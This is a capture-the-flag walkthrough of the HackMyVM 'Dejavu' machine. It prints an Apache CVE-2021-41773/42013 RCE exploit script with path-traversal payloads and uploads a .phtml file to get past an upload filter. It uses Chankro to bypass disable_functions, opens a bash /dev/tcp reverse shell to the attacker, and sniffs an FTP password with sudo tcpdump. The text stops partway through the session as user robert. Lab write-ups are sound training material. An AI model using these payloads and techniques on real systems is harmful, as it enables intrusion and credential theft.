# CTF Penetration Testing

## HackMyVM

### Dejavu - Machine

#### Machine Description

- Machine name: [Dejavu](https://hackmyvm.eu/machines/machine.php?vm=Dejavu)
- Machine type: Linux VM <img src="https://hackmyvm.eu/img/linux.png" alt="Linux" width="20"/>
- Machine difficulty: 🟩 Easy

<img src="https://hackmyvm.eu/img/vm/ez.png" alt="Dejavu Machine Logo" width="150"/>

#### Machine Writeup

<span style="color: #e57373;"><b>Attacker { os: kali linux }</b></span>

`ifconfig`:
```
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:1f:3c:b3:65  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
        ether 08:00:27:1e:36:4a  txqueuelen 1000  (Ethernet)
        RX packets 2566  bytes 1855261 (1.7 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1677  bytes 216486 (211.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.101  netmask 255.255.255.0  broadcast 192.168.56.255 ←
        inet6 fe80::b8a4:ba37:17c5:3d73  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:6e:4c:1d  txqueuelen 1000  (Ethernet)
        RX packets 846060  bytes 203584950 (194.1 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 556876  bytes 70167297 (66.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 1020  bytes 113200 (110.5 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1020  bytes 113200 (110.5 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping -a -g 192.168.56.0/24 2> /dev/null`:
```
192.168.56.100
192.168.56.101
192.168.56.112 ←
```

`nmap -Pn -sSV -p- -T5 192.168.56.112`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-16 04:44 EDT
Nmap scan report for 192.168.56.112
Host is up (0.00048s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) ←
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu)) ←
MAC Address: 08:00:27:A4:1F:98 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.72 seconds
```

`curl http://192.168.56.112`:
```html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <!--
    Modified from the Debian original for Ubuntu
    Last updated: 2016-11-16
    See: https://launchpad.net/bugs/1288690
  -->
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>Apache2 Ubuntu Default Page: It works</title>

[...]

  </head>
  <body>
    <div class="main_page">
      <div class="page_header floating_element">
        <img src="/icons/ubuntu-logo.png" alt="Ubuntu Logo" class="floating_element"/>
        <span class="floating_element">
          Apache2 Ubuntu Default Page
        </span>
      </div>
<!--      <div class="table_of_contents floating_element">
        <div class="section_header section_header_grey">
          TABLE OF CONTENTS
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#about">About</a>
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#changes">Changes</a>
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#scope">Scope</a>
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#files">Config files</a>
        </div>
      </div>
-->
      <div class="content_section floating_element">


        <div class="section_header section_header_red">
          <div id="about"></div>
          It works!
        </div>
        <div class="content_section_text">
          <p>
                This is the default welcome page used to test the correct 
                operation of the Apache2 server after installation on Ubuntu systems.
                It is based on the equivalent page on Debian, from which the Ubuntu Apache
                packaging is derived.
                If you can read this page, it means that the Apache HTTP server installed at
                this site is working properly. You should <b>replace this file</b> (located at
                <tt>/var/www/html/index.html</tt>) before continuing to operate your HTTP server.
          </p>

[...]

  </body>
</html>
```

`curl -I http//192.168.56.112`:
```
HTTP/1.1 200 OK
Date: Mon, 16 Sep 2024 08:50:30 GMT
Server: Apache/2.4.41 (Ubuntu) ←
Last-Modified: Fri, 13 May 2022 07:00:02 GMT
ETag: "2aa6-5dedf39363a32"
Accept-Ranges: bytes
Content-Length: 10918
Vary: Accept-Encoding
Content-Type: text/html
```

`searchsploit apache 2.4`:
```                        
---------------------------------------------------------- ---------------------------------
 Exploit Title                                            |  Path
---------------------------------------------------------- ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Exe | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + | php/remote/29316.py
Apache 2.2.4 - 413 Error HTTP Request Method Cross-Site S | unix/remote/30835.sh
Apache 2.4.17 - Denial of Service                         | windows/dos/39037.php
Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate | linux/local/46676.php
Apache 2.4.23 mod_http2 - Denial of Service               | linux/dos/40909.py
Apache 2.4.7 + PHP 7.0.2 - 'openssl_seal()' Uninitialized | php/remote/40142.php
Apache 2.4.7 mod_status - Scoreboard Handling Race Condit | linux/dos/34133.txt
Apache 2.4.x - Buffer Overflow                            | multiple/webapps/51193.py
Apache < 2.2.34 / < 2.4.27 - OPTIONS Memory Leak          | linux/webapps/42745.py
Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Service       | multiple/dos/26710.txt
Apache HTTP Server 2.4.49 - Path Traversal & Remote Code  | multiple/webapps/50383.sh
Apache HTTP Server 2.4.50 - Path Traversal & Remote Code  | multiple/webapps/50406.sh
Apache HTTP Server 2.4.50 - Remote Code Execution (RCE) ( | multiple/webapps/50446.sh ←
Apache HTTP Server 2.4.50 - Remote Code Execution (RCE) ( | multiple/webapps/50512.py ←

[...]
```

`cat /usr/share/exploitdb/exploits/multiple/webapps/50512.py`:
```python
# Exploit Title: Apache HTTP Server 2.4.50 - Remote Code Execution (RCE) (3)
# Date: 11/11/2021
# Exploit Author: Valentin Lobstein
# Vendor Homepage: https://apache.org/
# Version: Apache 2.4.49/2.4.50 (CGI enabled)
# Tested on: Debian GNU/Linux
# CVE : CVE-2021-41773 / CVE-2021-42013 ←
# Credits : Lucas Schnell

[...]

if len(sys.argv) < 2 :
    print( 'Use: python3 file.py ip:port ' )
    sys.exit()

def end():
    print("\t\033[1;91m[!] Bye bye !")
    time.sleep(0.5)
    sys.exit(1)

def commands(url,command,session):
    directory = mute_command(url,'pwd')
    user = mute_command(url,'whoami')
    hostname = mute_command(url,'hostname')
    advise = print(Fore.YELLOW + 'Reverse shell is advised (This isn\'t an interactive shell)')
    command = input(f"{Fore.RED}╭─{Fore.GREEN + user}@{hostname}: {Fore.BLUE + directory}\n{Fore.RED}╰─{Fore.YELLOW}$ {Style.RESET_ALL}")
    command = f"echo; {command};"
    req = requests.Request('POST', url=url, data=command)
    prepare = req.prepare()
    prepare.url = url
    response = session.send(prepare, timeout=5)
    output = response.text
    print(output)
    if 'clear' in command:
        os.system('/usr/bin/clear')
        print(header)
    if 'exit' in command:
        end()

def mute_command(url,command):
    session = requests.Session()
    req = requests.Request('POST', url=url, data=f"echo; {command}")
    prepare = req.prepare()
    prepare.url = url
    response = session.send(prepare, timeout=5)
    return response.text.strip()


def exploitRCE(payload):
    s = requests.Session()
    try:
        host = sys.argv[1]
        if 'http' not in host:
            url = 'http://'+ host + payload
        else:
            url = host + payload
        session = requests.Session()
        command = "echo; id"
        req = requests.Request('POST', url=url, data=command)
        prepare = req.prepare()
        prepare.url = url
        response = session.send(prepare, timeout=5)
        output = response.text
        if "uid" in output:
            choice = "Y"
            print( Fore.GREEN + '\n[!] Target %s is vulnerable !!!' % host)
            print("[!] Sortie:\n\n" + Fore.YELLOW + output )
            choice = input(Fore.CYAN + "[?] Do you want to exploit this RCE ? (Y/n) : ")
            if choice.lower() in ['','y','yes']:
                while True:
                    commands(url,command,session)
            else:
                end()
        else :
            print(Fore.RED + '\nTarget %s isn\'t vulnerable' % host)
    except KeyboardInterrupt:
        end()

def main():
    try:
        apache2449_payload = '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash'
        apache2450_payload = '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash'
        payloads = [apache2449_payload,apache2450_payload]
        choice = len(payloads) + 1
        print(header)
        print("\033[1;37m[0] Apache 2.4.49 RCE\n[1] Apache 2.4.50 RCE")
        while choice >= len(payloads) and choice >= 0:
            choice = int(input('[~] Choice : '))
            if choice < len(payloads):
                exploitRCE(payloads[choice])
    except KeyboardInterrupt:
            print("\n\033[1;91m[!] Bye bye !")
            time.sleep(0.5)
            sys.exit(1)

if __name__ == '__main__':
    main()
```

`cp /usr/share/exploitdb/exploits/multiple/webapps/50512.py ./`

`python3 ./50512.py 192.168.56.112:80`:
```
Target 192.168.56.112:80 isn't vulnerable ←
```
❌ Failed Step.

`gobuster dir -u http://192.168.56.112 -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,bak,jpg,txt,zip -b 400,401,404,500 -t 100`:
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.112
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   400,401,404,500
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,bak,jpg,txt,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 10918]
/info.php             (Status: 200) [Size: 69957] ←
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
Progress: 1323360 / 1323366 (100.00%)
===============================================================
Finished
===============================================================
```

`curl http://192.168.56.112/info.php`:
```html
<html>
<body>
<!-- /S3cR3t --> ←
</body>
</html>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<style type="text/css">
body {background-color: #fff; color: #222; font-family: sans-serif;}

[...]
```

`curl http://192.168.56.112/S3cR3t`:
```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /S3cR3t</title>
 </head>
 <body>
<h1>Index of /S3cR3t</h1> ←
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/folder.gif" alt="[DIR]"></td><td><a href="files/">files/</a></td><td align="right">2022-05-13 10:21  </td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="upload.php">upload.php</a></td><td align="right">2022-05-13 11:52  </td><td align="right">1.3K</td><td>&nbsp;</td></tr> ←
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.41 (Ubuntu) Server at 192.168.56.112 Port 80</address>
</body></html>
```

`lynx http://192.168.56.112/S3cR3t/`:
```
Index of /S3cR3t

[ICO]       Name                   Last modified      Size  Description
[PARENTDIR] Parent Directory        -                  -    
[DIR]       files/                 2022-05-13 10:21    -    
[ ]         upload.php             2022-05-13 11:52    1.3K ←

Apache/2.4.41 (Ubuntu) Server at 192.168.56.112 Port 80
```

```
Upload your file

[_________________________] [Upload] ←
```

`vim ./php_test.php`:
```php
<?php echo "This is just an echo PHP test."; ?>
```

`lynx http://192.168.56.112/S3cR3t/upload.php`:
```
Upload your file

[./php_test.php__________] [Upload] ←

This extension is not allowed. Sorry, your file was not uploaded. ← 
```
❌ Failed Step.

`vim ./php_test.phtml`:
```php
<?php echo "This is just an echo PHTML test."; ?>
```

`lynx http://192.168.56.112/S3cR3t/upload.php`:
```
Upload your file

[./php_test.phtml________] [Upload] ←

The file php_test.phtml has been uploaded. ← 
```

`lynx http://192.168.56.112/S3cR3t/files/php_test.phtml`:
```
This is just an echo PHTML test. ←
```

`lynx http://192.168.56.112/info.php`

| Directive                 | Local Value                                                                                                                                                                                                                                                                                   | Master Value                                                                                                                                                                                                                                                                        |
|---------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| allow_url_fopen           | On                                                                                                                                                                                                                                                                                            | On                                                                                                                                                                                                                                                                                  |
| allow_url_include         | Off                                                                                                                                                                                                                                                                                           | Off                                                                                                                                                                                                                                                                                 |
| arg_separator.input       | &                                                                                                                                                                                                                                                                                             | &                                                                                                                                                                                                                                                                                   |
| arg_separator.output      | &                                                                                                                                                                                                                                                                                             | &                                                                                                                                                                                                                                                                                   |
| auto_append_file          | no value                                                                                                                                                                                                                                                                                      | no value                                                                                                                                                                                                                                                                            |
| auto_globals_jit          | On                                                                                                                                                                                                                                                                                            | On                                                                                                                                                                                                                                                                                  |
| auto_prepend_file         | no value                                                                                                                                                                                                                                                                                      | no value                                                                                                                                                                                                                                                                            |
| browscap                  | no value                                                                                                                                                                                                                                                                                      | no value                                                                                                                                                                                                                                                                            |
| default_charset           | UTF-8                                                                                                                                                                                                                                                                                         | UTF-8                                                                                                                                                                                                                                                                               |
| default_mimetype          | text/html                                                                                                                                                                                                                                                                                     | text/html                                                                                                                                                                                                                                                                           |
| disable_classes           | no value                                                                                                                                                                                                                                                                                      | no value                                                                                                                                                                                                                                                                            |
| disable_functions ←       | system, exec, passthru, shell_exec, proc_open, proc_get_status, proc_terminate, proc_close, virtual, popen, show_source, curl_multi_exec, pcntl_alarm, pcntl_fork, pcntl_waitpid, pcntl_wait, pcntl_wifexited, pcntl_wifstopped, pcntl_wifsignaled, pcntl_wifcontinued, pcntl_wexitstatus, pcntl_wtermsig, pcntl_wstopsig, pcntl_signal, pcntl_signal_get_handler, pcntl_signal_dispatch, pcntl_get_last_error, pcntl_strerror, pcntl_sigprocmask, pcntl_sigwaitinfo, pcntl_sigtimedwait, pcntl_exec, pcntl_getpriority, pcntl_setpriority, pcntl_async_signals, pcntl_unshare | system, exec, passthru, shell_exec, proc_open, proc_get_status, proc_terminate, proc_close, virtual, popen, show_source, curl_multi_exec, pcntl_alarm, pcntl_fork, pcntl_waitpid, pcntl_wait, pcntl_wifexited, pcntl_wifstopped, pcntl_wifsignaled, pcntl_wifcontinued, pcntl_wexitstatus, pcntl_wtermsig, pcntl_wstopsig, pcntl_signal, pcntl_signal_get_handler, pcntl_signal_dispatch, pcntl_get_last_error, pcntl_strerror, pcntl_sigprocmask, pcntl_sigwaitinfo, pcntl_sigtimedwait, pcntl_exec, pcntl_getpriority, pcntl_setpriority, pcntl_async_signals, pcntl_unshare |
| display_errors            | Off                                                                                                                                                                                                                                                                                           | Off                                                                                                                                                                                                                                                                                 |
| display_startup_errors    | Off                                                                                                                                                                                                                                                                                           | Off                                                                                                                                                                                                                                                                                 |
| doc_root                  | no value                                                                                                                                                                                                                                                                                      | no value                                                                                                                                                                                                                                                                            |
| docref_ext                | no value                                                                                                                                                                                                                                                                                      | no value                                                                                                                                                                                                                                                                            |
| docref_root               | no value                                                                                                                                                                                                                                                                                      | no value                                                                                                                                                                                                                                                                            |
| enable_dl                 | Off                                                                                                                                                                                                                                                                                           | Off                                                                                                                                                                                                                                                                                 |
| enable_post_data_reading  | On                                                                                                                                                                                                                                                                                            | On                                                                                                                                                                                                                                                                                  |
| error_append_string       | no value                                                                                                                                                                                                                                                                                      | no value                                                                                                                                                                                                                                                                            |
| error_log                 | no value                                                                                                                                                                                                                                                                                      | no value                                                                                                                                                                                                                                                                            |

<div>
	<img src="assets/logo_github.png" alt="GitHub Logo" width="16" height="auto">
	<span style="color: white; font-size: 110%;"><strong>GitHub</strong></span>
</div>

[Chankro](https://github.com/TarlogicSecurity/Chankro/tree/master)

**#Chankro**. Your favourite tool to bypass **disable_functions** and **open_basedir** in your pentests.

`vim ./reverse_shell.sh`:
```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.56.101/4444 0>&1
```

`python2 chankro.py --arch 64 --input reverse_shell.sh --output reverse_shell.phtml --path /var/www/html/`:
```
     -=[ Chankro ]=-
    -={ @TheXC3LL }=-


[+] Binary file: reverse_shell.sh
[+] Architecture: x64
[+] Final PHP: reverse_shell.phtml ←


[+] File created! ←
```

`lynx http://192.168.56.112/S3cR3t/upload.php`:
```
Upload your file

[./reverse_shell.phtml___] [Upload] ←

The file reverse_shell.phtml has been uploaded. ← 
```

`nc -lnvp 4444`:
```
listening on [any] 4444 ... ←
```

`curl http://192.168.56.112/S3cR3t/files/reverse_shell.phtml`

```
connect to [192.168.56.101] from (UNKNOWN) [192.168.56.112] 51772 ←
bash: cannot set terminal process group (758): Inappropriate ioctl for device
bash: no job control in this shell
<nMostCriticalInternetSecurityThreats/S3cR3t/files$ 
```

<span style="color: #64b5f6;"><b>Victim { os: ubuntu linux, user: <code>www-data</code> }</b></span>

`python3 -c 'import pty; pty.spawn("/bin/bash")' && stty raw -echo && fg; export TERM=xterm; stty rows $(tput lines) cols $(tput cols)`

`whoami`:
```
www-data ←
```

`hostname`:
```
dejavu
```

`uname -a`:
```
Linux dejavu 5.4.0-110-generic #124-Ubuntu SMP Thu Apr 14 19:46:19 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

`ls -alps /home/`:
```
total 12
4 drwxr-xr-x  3 root   root   4096 May 12  2022 ./
4 drwxr-xr-x 19 root   root   4096 May 12  2022 ../
4 drwxr-xr-x  5 robert robert 4096 May 13  2022 robert/ ←
```

`cd /home/robert`

`ls -alps`:
```
total 48
4 drwxr-xr-x 5 robert robert 4096 May 13  2022 ./
4 drwxr-xr-x 3 root   root   4096 May 12  2022 ../
0 lrwxrwxrwx 1 robert robert    9 May 13  2022 .bash_history -> /dev/null
4 -rw-r--r-- 1 robert robert  220 Feb 25  2020 .bash_logout
4 -rw-r--r-- 1 robert robert 3771 Feb 25  2020 .bashrc
4 drwx------ 2 robert robert 4096 May 12  2022 .cache/
4 drwxrwxr-x 3 robert robert 4096 May 13  2022 .local/
4 -rw-r--r-- 1 robert robert  807 Feb 25  2020 .profile
4 -rw-rw-r-- 1 robert robert   66 May 13  2022 .selected_editor
4 drwx------ 2 robert robert 4096 May 12  2022 .ssh/
0 -rw-r--r-- 1 robert robert    0 May 12  2022 .sudo_as_admin_successful
4 -rw-rw-r-- 1 robert robert  215 May 13  2022 .wget-hsts
4 -r-x------ 1 robert robert   72 May 13  2022 auth.sh
4 -r-------- 1 robert robert   38 May 13  2022 user.txt ←
```

`cat user.txt`:
```
cat: user.txt: Permission denied ←
```

`cd /var/www/html`

`nc`:
```
usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]
          [-m minttl] [-O length] [-P proxy_username] [-p source_port]
          [-q seconds] [-s source] [-T keyword] [-V rtable] [-W recvlimit] [-w timeout]
          [-X proxy_protocol] [-x proxy_address[:port]]           [destination] [port]
```

`nc -lnvp 5555 > ./linpeas.sh`:
```
Listening on 0.0.0.0 5555 ←
```

<span style="color: #e57373;"><b>Attacker { os: kali linux }</b></span>

`cat /opt/linpeas.sh | nc 192.168.56.112 5555`

<span style="color: #64b5f6;"><b>Victim { os: ubuntu linux, user: <code>www-data</code> }</b></span>

```
Connection received on 192.168.56.101 40478 ←
```

`./linpeas.sh > ./linpeas_output.txt`

`cat ./linpeas_output.txt`:
```
[...]

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version             
Sudo version 1.8.31 ←

[...]

╔══════════╣ Can I sniff with tcpdump?
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sniffing                 
You can sniff with tcpdump!      

[...]

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid            
Matching Defaults entries for www-data on dejavu:                                           
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on dejavu:
    (robert) NOPASSWD: /usr/sbin/tcpdump ←

[...]

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld.so                    
/etc/ld.so.conf                                                                             
Content of /etc/ld.so.conf:                                                                 
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf                                                               
  - /usr/local/lib                                                                          
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
  - /usr/local/lib/x86_64-linux-gnu                                                         
  - /lib/x86_64-linux-gnu
  - /usr/lib/x86_64-linux-gnu

/etc/ld.so.preload
╔══════════╣ Capabilities                                                                   
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities             
══╣ Current shell capabilities                                                              
CapInh:  0x0000000000000000=                                                                
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
CapAmb:  0x0000000000000000=

══╣ Parent process capabilities
CapInh:  0x0000000000000000=                                                                
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
CapAmb:  0x0000000000000000=


Files with capabilities (limited to 50):
/snap/core20/1328/usr/bin/ping = cap_net_raw+ep
/snap/core20/1434/usr/bin/ping = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip ←
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep

[...]
```

`sudo -l`:
```
Matching Defaults entries for www-data on dejavu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on dejavu:
    (robert) NOPASSWD: /usr/sbin/tcpdump ←
```

`tcpdump -i lo`:
```
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
13:13:01.322947 IP localhost.36704 > localhost.ftp: Flags [S], seq 3947459350, win 65495, options [mss 65495,sackOK,TS val 3703854229 ecr 0,nop,wscale 7], length 0
13:13:01.322959 IP localhost.ftp > localhost.36704: Flags [S.], seq 3058159664, ack 3947459351, win 65483, options [mss 65495,sackOK,TS val 3703854229 ecr 3703854229,nop,wscale 7], length 0
13:13:01.322967 IP localhost.36704 > localhost.ftp: Flags [.], ack 1, win 512, options [nop,nop,TS val 3703854229 ecr 3703854229], length 0
13:13:01.324530 IP localhost.ftp > localhost.36704: Flags [P.], seq 1:21, ack 1, win 512, options [nop,nop,TS val 3703854231 ecr 3703854229], length 20: FTP: 220 (vsFTPd 3.0.3) ←
13:13:01.324574 IP localhost.36704 > localhost.ftp: Flags [.], ack 21, win 512, options [nop,nop,TS val 3703854231 ecr 3703854231], length 0
13:13:01.324716 IP localhost.36704 > localhost.ftp: Flags [P.], seq 1:14, ack 21, win 512, options [nop,nop,TS val 3703854231 ecr 3703854231], length 13: FTP: USER robert ←
13:13:01.324719 IP localhost.ftp > localhost.36704: Flags [.], ack 14, win 512, options [nop,nop,TS val 3703854231 ecr 3703854231], length 0
13:13:01.324741 IP localhost.ftp > localhost.36704: Flags [P.], seq 21:55, ack 14, win 512, options [nop,nop,TS val 3703854231 ecr 3703854231], length 34: FTP: 331 Please specify the password.
13:13:01.324749 IP localhost.36704 > localhost.ftp: Flags [.], ack 55, win 512, options [nop,nop,TS val 3703854231 ecr 3703854231], length 0
13:13:01.324757 IP localhost.36704 > localhost.ftp: Flags [P.], seq 14:32, ack 55, win 512, options [nop,nop,TS val 3703854231 ecr 3703854231], length 18: FTP: PASS 9737bo0hFx4 ←
13:13:01.324758 IP localhost.ftp > localhost.36704: Flags [.], ack 32, win 512, options [nop,nop,TS val 3703854231 ecr 3703854231], length 0
13:13:01.332393 IP localhost.ftp > localhost.36704: Flags [P.], seq 55:78, ack 32, win 512, options [nop,nop,TS val 3703854239 ecr 3703854231], length 23: FTP: 230 Login successful.
13:13:01.332399 IP localhost.36704 > localhost.ftp: Flags [.], ack 78, win 512, options [nop,nop,TS val 3703854239 ecr 3703854239], length 0
13:13:01.332417 IP localhost.36704 > localhost.ftp: Flags [P.], seq 32:38, ack 78, win 512, options [nop,nop,TS val 3703854239 ecr 3703854239], length 6: FTP: QUIT
13:13:01.332422 IP localhost.ftp > localhost.36704: Flags [.], ack 38, win 512, options [nop,nop,TS val 3703854239 ecr 3703854239], length 0
13:13:01.332444 IP localhost.ftp > localhost.36704: Flags [P.], seq 78:92, ack 38, win 512, options [nop,nop,TS val 3703854239 ecr 3703854239], length 14: FTP: 221 Goodbye.
13:13:01.332446 IP localhost.36704 > localhost.ftp: Flags [.], ack 92, win 512, options [nop,nop,TS val 3703854239 ecr 3703854239], length 0
13:13:01.332523 IP localhost.36704 > localhost.ftp: Flags [F.], seq 38, ack 92, win 512, options [nop,nop,TS val 3703854239 ecr 3703854239], length 0
13:13:01.333161 IP localhost.ftp > localhost.36704: Flags [F.], seq 92, ack 39, win 512, options [nop,nop,TS val 3703854240 ecr 3703854239], length 0
13:13:01.333166 IP localhost.36704 > localhost.ftp: Flags [.], ack 93, win 512, options [nop,nop,TS val 3703854240 ecr 3703854240], length 0
```

<span style="color: #e57373;"><b>Attacker { os: kali linux }</b></span>

`ssh robert@192.168.56.112`:
```
The authenticity of host '192.168.56.112 (192.168.56.112)' can't be established.
ED25519 key fingerprint is SHA256:FD1A1ljJduPbF4mqrQ/syFJggyYhGxfrZKrduHM3VDA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.112' (ED25519) to the list of known hosts.
robert@192.168.56.112's password: ←
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-110-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 16 Sep 2024 03:18:27 PM UTC

  System load:  0.0               Processes:               159
  Usage of /:   48.6% of 8.90GB   Users logged in:         0
  Memory usage: 26%               IPv4 address for enp0s3: 192.168.56.112
  Swap usage:   0%


30 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri May 13 15:52:25 2022
```

<span style="color: #64b5f6;"><b>Victim { os: ubuntu linux, user: <code>robert</code> }</b></span>

`whoami`:
```
robert ←
```

`cd /home/robert`

`ls -alps`:
```
total 48
4 drwxr-xr-x 5 robert robert 4096 May 13  2022 ./
